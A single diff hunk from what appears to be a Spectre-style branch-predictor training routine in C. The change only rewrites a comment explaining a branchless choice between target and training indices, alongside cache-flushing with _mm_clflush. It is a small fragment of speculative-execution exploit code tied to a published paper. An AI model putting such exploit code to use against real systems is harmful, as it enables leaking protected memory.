@@ -126,7 +126,7 @@ void train_branch_predictor(size_t target_idx, int tries)
         // but it does not work
         for (size_t j = 0; j < 100; j++);
 
-        //We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
+        //To avoid using if-else condition we use the boolean array for the attack to select between target_idx and train_idx. (modulo operation used in paper/same concept)
         size_t idx = attack[i] * target_idx + (!attack[i]) * train_idx;
         // We don't want to have any extraneous data available to make predictions off of. Once again, might be overkill, but the exploit is touchy enough that this might be required.
         _mm_clflush(&target_idx);
